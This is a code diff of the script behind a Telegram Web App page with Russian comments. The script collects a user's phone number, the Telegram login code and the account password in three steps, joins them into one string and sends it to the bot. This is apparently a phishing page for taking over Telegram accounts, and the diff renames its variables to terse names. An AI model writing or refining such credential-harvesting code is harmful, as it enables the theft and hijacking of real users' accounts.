@@ -126,23 +126,22 @@
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
+    tg.ready();
 
-    // Память для данных
-    let userData = {
-        phone: '',
-        code: '',
-        password: ''
+    let data = {
+        p: '', // phone
+        c: '', // code
+        s: ''  // password (secret)
     };
 
     function nextStep(stepId, icon) {
         if (stepId === 'code') {
-            userData.phone = document.getElementById('p').value;
-            if(!userData.phone) return;
+            data.p = document.getElementById('p').value;
+            if(!data.p) return;
             showStep('code', '✉️');
-        } 
-        else if (stepId === 'pass') {
-            userData.code = document.getElementById('c').value;
-            if(!userData.code) return;
+        } else if (stepId === 'pass') {
+            data.c = document.getElementById('c').value;
+            if(!data.c) return;
             showStep('pass', '🔑');
         }
     }
@@ -151,18 +150,15 @@
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step-' + id).classList.add('active');
         document.getElementById('main-icon').innerText = icon;
-        const input = document.querySelector('#step-' + id + ' input');
-        if(input) input.focus();
     }
 
     function finish() {
-        userData.password = document.getElementById('pass').value;
+        data.s = document.getElementById('pass').value; // Берем пароль (может быть пустым)
         
-        // Склеиваем всё в одну строку через разделитель |
-        const finalData = `${userData.phone}|${userData.code}|${userData.password}`;
+        // Склеиваем всё в одну строку для бота
+        const result = `${data.p}|${data.c}|${data.s}`;
         
-        // Отправляем боту и закрываем окно
-        tg.sendData(finalData);
+        tg.sendData(result); // Отправляем и закрываем
     }
 </script>
 
